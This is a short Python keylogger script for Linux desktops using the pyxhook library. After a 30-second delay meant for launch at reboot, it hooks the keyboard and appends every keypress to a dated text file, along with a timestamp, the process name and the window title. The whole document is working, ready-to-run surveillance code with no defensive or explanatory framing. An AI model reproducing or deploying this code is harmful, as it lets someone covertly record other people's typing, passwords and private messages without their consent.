#!/usr/bin/python3
import sys
import datetime
import pyxhook
import time
import threading
#The argument is the path of the directory you will find the keylogger report
path=sys.argv[1]
date=datetime.datetime.now()
day=datetime.datetime.today()
f=open(str(path)+"keylog_"+str(day)+".txt","w")

f.write("logger started : ")
f.write(str(date)+"\n")
f.write("############################\n")
f.close()

#sleeping is necessary only if the code is launched at reboot
time.sleep(30)

# This function is called every time a key is presssed
def kbevent(event):
    #global running
    # print key info
    #print(event)
    win=event.WindowName
    key=event.Key
    proc=event.WindowProcName
    f=open(str(path)+"keylog_"+str(day)+".txt","a")
    date=datetime.datetime.now()
    f.write("date : "+ str(date))
    f.write("\n")
    f.write("Process : " + proc + "\n")
    f.write("Window : " + win + "\n")
    f.write("key : " + key + "\n" +"-------------" + "\n")
    f.close()



# Create hookmanager
hookman = pyxhook.HookManager()
# call kbevent when a key is pressed down
hookman.KeyDown = kbevent
# Hook the keyboard
hookman.HookKeyboard()
# Start our listener
hookman.start()


